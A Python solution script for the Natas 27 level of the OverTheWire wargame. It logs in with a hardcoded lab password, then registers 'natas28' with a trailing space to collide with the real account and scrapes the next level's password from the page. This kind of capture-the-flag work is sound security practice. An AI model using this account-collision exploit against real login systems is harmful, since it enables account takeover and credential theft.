#!/usr/bin/env python3

import requests
import re
import base64
import urllib

username = 'natas27'
password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth = (username, password))
# it does not matter how long the username is. It could be more than 64 chars but it's easier to just add a space after
# the username to get the password
response = session.post(url, data = { "username": "natas28" + " ", "password": "anything" }, auth = (username, password))
response = session.post(url, data = { "username": "natas28", "password": "anything" }, auth = (username, password))

# print(response.text)
print(re.findall('=&gt; (.*)\n', response.text)[1])